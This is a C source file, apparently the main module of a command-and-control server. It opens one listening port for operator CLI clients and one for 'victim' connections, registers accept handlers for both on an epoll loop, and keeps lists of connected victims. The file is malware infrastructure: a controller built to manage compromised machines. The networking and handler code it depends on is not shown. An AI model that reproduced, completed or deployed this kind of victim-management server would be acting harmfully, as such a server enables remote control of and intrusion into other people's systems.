#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include <string.h>
#include <sys/socket.h>
#include <fcntl.h>
#include <arpa/inet.h>

#include "server.h"
//#include "netwerking.h"

/* Global Vars */
struct commandServer server; /* Server global state  */

/* Admittedly it is overkill and probably overly complicated. Mayble will clean up later, but it's fun?  */
void asciiArt(void){
#include "asciilogo.h"

        char *buf = malloc(1024*16);

        snprintf(buf, 1024*16, ascii_logo, 
                KRED, 
                KNRM, KRED, 
                KGRAY, KNRM, KRED, KNRM, KRED, 
                KGRAY, KNRM, KRED, KNRM, KGRAY, KYEL, KNRM, KRED, 
                KGRAY, KNRM, KRED, KNRM, KGRAY, KYEL, KNRM, KRED, 
                KGRAY, KYEL,
                KGRAY, KYEL, KNRM, KRED, (long) getpid(),
                KGRAY, KYEL,
                KNRM, KRED, server.cli_port,
                KGRAY, KYEL, KNRM 
        );
  
        printf("%s", buf);

        free(buf);
}

/* ==== Server Configurations ====  */

int openTcpSocket(int port, int *fd, int *count){
        fd[*count] = initTcpServer(port);
        (*count)++; 
        netNonBlock(NULL, *fd);
        
        return 0;
}

void initServer(void){
        server.pid = getpid();
       
        server.cli_port = DEFAULT_CLI_PORT;
        server.clifd_count = 0;
        
        server.victim_port = DEFAULT_VICTIM_PORT;
        server.victimfd_count = 0;

        server.event_loop = createEpollEventLoop();
        if (server.event_loop == NULL) {
                perror("Failed to create epoll event loop");
                exit(-1);
        }

        /* Open Sockets for both cli and victim clients */
        openTcpSocket(server.cli_port, server.clifd, &server.clifd_count);
        openTcpSocket(server.victim_port, server.victimfd, &server.victimfd_count);
       
        /* Initialize Server Commands */

        /* Add client socket fd to epoll - handle connecting cli clients */
        int j;
        for(j=0; j < server.clifd_count; j++) {
               if (addEpollEvent(server.event_loop, server.clifd[j], EVENT_READ, handleCliAccept, NULL) == EVENT_ERR)                  
                        perror("createEpollFileEvent");
        }
        
        /* Add victim socket fd to epoll - handle connecting victim clients */
        for(j=0; j < server.victimfd_count; j++) {
               if (addEpollEvent(server.event_loop, server.victimfd[j], EVENT_READ, handleVictimAccept, NULL) == EVENT_ERR)                  
                        perror("createEpollFileEvent");
        }

        server.victims = createList();
        server.cli = createList();
                
}

/* ==== Welcome to the Main Event ====  */

int main(void){
  
        initServer();
        asciiArt();

        eventMain(server.event_loop);
       
        // delete eventloop & cleanup memory

        return 0;
}
